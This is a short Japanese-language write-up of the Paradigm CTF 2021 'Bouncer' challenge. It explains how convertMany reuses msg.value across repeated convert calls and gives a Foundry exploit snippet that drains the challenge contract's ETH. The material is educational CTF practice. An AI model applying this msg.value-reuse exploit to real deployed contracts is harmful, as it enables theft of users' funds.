# Paradigm CTF 2021: Bouncer

`Setup`コントラクトの`isSolved`関数を見ると、`bouncer`のbalanceを0にすれば良いことがわかる。

まず、`Setup`コントラクトの`constructor()`の処理を追っていく。
- `msg.value`は100 etherでないと駄目。
- `Bouncer`コントラクトを、valueは50 etherとして作成する。
- `Bouncer`コントラクトのコンストラクタでは、`owner`を`msg.sender`に設定する。
- `bouncer`の`enter`関数がWETHとETHそれぞれに対し呼ばれる。valueを1 ether、引数の`amount`を10 etherとしている。
- `enter`関数は、valueが1 etherであることを強制しており、`mapping(address => Entry[])`の`entries`変数に対して、`entries[msg.value]`に`Entry`構造体の要素を追加している。

`entries`とは？
- `function convert(address who, uint256 id) public payable`で使われている。
- `convert`関数は、`entry`で入金に対して、`function proofOfOwnership(ERC20Like token, address from, uint256 amount) public payable`を実行する。
- `proofOfOwnership`は、ETHであれば、`msg.value == amount`をチェックし、WETHであれば、`transferFrom`を`who`から`Bouncer`コントラクトに実行して、それが成功するかをチェックする。
- この`convert`関数を複数回実行する`convertMany`関数がある。

ここで`convertMany`関数の内部で実行する`convert`関数で`msg.value`を使いまわしでき、`tokens`に追加される`amount`をかさ増しできることがわかる。

```solidity
Bouncer bouncer = Bouncer(setup.bouncer());
uint initialBalance = address(bouncer).balance; 
uint amount = initialBalance + 2 ether;
bouncer.enter{value: 1 ether}(ETH, amount); 
bouncer.enter{value: 1 ether}(ETH, amount); 
vm.warp(block.timestamp + 1);
uint[] memory ids = new uint[](2);
ids[0] = 0;
ids[1] = 1;
bouncer.convertMany{value: amount}(playerAddress, ids); 
bouncer.redeem(ERC20Like(ETH), amount * 2);
```

Test:
```
forge test --match-contract BouncerExploitTest -vvvv
```